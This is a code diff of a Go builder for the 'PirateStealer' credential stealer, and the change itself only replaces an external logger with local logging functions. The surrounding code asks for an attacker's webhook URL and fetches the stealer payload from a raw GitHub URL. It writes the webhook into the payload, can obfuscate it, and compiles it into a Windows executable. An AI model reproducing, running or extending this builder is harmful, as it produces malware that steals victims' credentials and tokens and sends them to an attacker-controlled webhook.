@@ -11,7 +11,6 @@ import (
 	"strings"
 	"time"
 
-	"github.com/StampyGumball/pirate-stealer-by-bytixo/tree/main/src/Undetected/Builder/logger"
 )
 
 var (
@@ -33,7 +32,7 @@ type Config struct {
 
 func init() {
 	cfg = loadConfig("config.json")
-	logger.Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
+	Error("\nYour Config (see config.txt for options and help):\n", fmt.Sprintf(`Platforms: %s Obfuscate (WARNING: experimental, always test it before using the grabber, we won't fix bugs you had if you used obfuscation :Instant feature may break often): %s Logout: %s Disable-qr-code: %s InjectNotify: %s LogoutNotify: %s InitNotify: %s Embed Color: %s`,
 		fmt.Sprint(cfg.Platform)+"\n",
 		fmt.Sprint(cfg.Obfuscate)+"\n",
 		cfg.Logout+"\n",
@@ -45,9 +44,9 @@ func init() {
 }
 
 func main() {
-	logger.Info("Enter Webhook URL:")
+	Info("Enter Webhook URL:")
 	fmt.Scanln(&webhook)
-	logger.Info("Enter exe name:")
+	Info("Enter exe name:")
 	fmt.Scanln(&name)
 	switch {
 	case !strings.Contains(name, ".exe"):
@@ -60,7 +59,7 @@ func loadConfig(file string) Config {
 	var config Config
 	cfg, err := os.Open(file)
 	if err != nil {
-		logger.Error(err.Error())
+		Error(err.Error())
 	}
 	defer cfg.Close()
 
@@ -141,72 +140,72 @@ func buildPlatform() {
 		switch platform {
 		case "windows":
 
-			logger.Info("Starting to compile")
+			Info("Starting to compile")
 			// Check for node
 			_, err := exec.Command("node", "-v").Output()
 			if err != nil {
-				logger.Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
+				Fatal("You must have node installed and added to your ENVIRONMENT VARIABLES (PATH) in order to use this program. see: https://nodejs.org/en/download/  | Will exit in 5 seconds", err)
 				time.Sleep(5 * time.Second)
 				os.Exit(1)
 			}
-			logger.Info("Installing deps")
+			Info("Installing deps")
 
 			// Install dependencies
 			_, err = exec.Command("npm", "install").Output()
 			if err != nil {
-				logger.Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
+				Fatal("Please make sure package.json and package-lock.json are in the same folder that the .exe | Will exit in 5 seconds", err)
 				time.Sleep(5 * time.Second)
 				os.Exit(1)
 			}
 			// Check pkg
 			_, err = exec.Command("nexe", "-v").Output()
 			if err != nil {
-				logger.Info("Installing nexe")
+				Info("Installing nexe")
 				_, err = exec.Command("npm", "install", "-g", "nexe").Output()
 				if err != nil {
-					logger.Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
+					Fatal(`Error while installing nexe, "npm install -g nexe", run this command in cmd please. Will exit in 5 seconds`, err)
 					time.Sleep(5 * time.Second)
 					os.Exit(1)
 				}
 			}
-			logger.Info("Building Windows")
+			Info("Building Windows")
 			wincode := getCode("https://raw.githubusercontent.com/bytixo/PirateStealer/main/src/Undetected/index-win.js")
 			err = ioutil.WriteFile("index-win.js", []byte(wincode), 0666)
 			if err != nil {
-				logger.Fatal("Error writing to file", err)
+				Fatal("Error writing to file", err)
 			}
 			if cfg.Obfuscate {
-				logger.Info("Obfuscating ...")
+				Info("Obfuscating ...")
 				_, err := exec.Command("javascript-obfuscator", "-v").Output()
 				if err != nil {
-					logger.Fatal("Installing javascript-obfuscator", err)
+					Fatal("Installing javascript-obfuscator", err)
 					_, err = exec.Command("npm", "install", "-g", "javascript-obfuscator").Output()
 					if err != nil {
-						logger.Fatal(`Error while installing javascript-obfuscator, "npm install -g javascript-obfuscator", run this command in cmd please. Will exit in 5 seconds`, err)
+						Fatal(`Error while installing javascript-obfuscator, "npm install -g javascript-obfuscator", run this command in cmd please. Will exit in 5 seconds`, err)
 						time.Sleep(5 * time.Second)
 						os.Exit(1)
 					}
 				}
 				out, err := exec.Command("javascript-obfuscator", "index-win.js", "--config", "obf-config.json", "--output", "output.js").Output()
 				if err != nil {
-					logger.Fatal("Error with Obfuscator", err)
+					Fatal("Error with Obfuscator", err)
 				}
-				logger.Info(fmt.Sprintf(`Out Obf Command: %s`, out))
+				Info(fmt.Sprintf(`Out Obf Command: %s`, out))
 				time.Sleep(time.Second)
 				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
 				v := versions[rand.Intn(len(versions))]
 				t := fmt.Sprintf(`-t %s`, v)
-				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s output.js`, t, name))
+				Info(fmt.Sprintf(`Compiling: nexe %s -o %s output.js`, t, name))
 				_, err = exec.Command("nexe", "-t", v, "-r", "node_modules/", "-o", name, "output.js").Output()
 				if err != nil {
-					logger.Fatal("Error while compiling", err)
+					Fatal("Error while compiling", err)
 					time.Sleep(5 * time.Second)
 					os.Exit(1)
 				}
 
 				err = os.RemoveAll("output.js")
 				if err != nil {
-					logger.Info("Error while removing file", err)
+					Info("Error while removing file", err)
 				}
 
 			} else {
@@ -214,15 +213,15 @@ func buildPlatform() {
 				versions := []string{"win32-x64-14.15.3", "win32-x64-14.15.1"}
 				v := versions[rand.Intn(len(versions))]
 				t := fmt.Sprintf(`-t %s`, v)
-				logger.Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
+				Info(fmt.Sprintf(`Compiling: nexe %s -o %s index-win.js`, t, name))
 				_, err = exec.Command("nexe", "-t", v, "-o", name, "index-win.js").Output()
 				if err != nil {
-					logger.Fatal("Error while compiling", err)
+					Fatal("Error while compiling", err)
 					time.Sleep(5 * time.Second)
 					os.Exit(1)
 				}
 			}
-			logger.Info("Windows Executable has been built with your webhook")
+			Info("Windows Executable has been built with your webhook")
 			time.Sleep(time.Second * 5)
 
 		}
@@ -232,7 +231,7 @@ func buildPlatform() {
 func getCode(url string) string {
 	req, err := http.NewRequest("GET", url, nil)
 	if err != nil {
-		logger.Fatal(err)
+		Fatal(err)
 	}
 
 	httpClient := http.Client{
@@ -241,12 +240,12 @@ func getCode(url string) string {
 
 	resp, err := httpClient.Do(req)
 	if err != nil {
-		logger.Fatal(err)
+		Fatal(err)
 	}
 	defer resp.Body.Close()
 	r, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		logger.Error(err)
+		Error(err)
 	}
 	//replace webhook
 	c := cfgChanges(r)
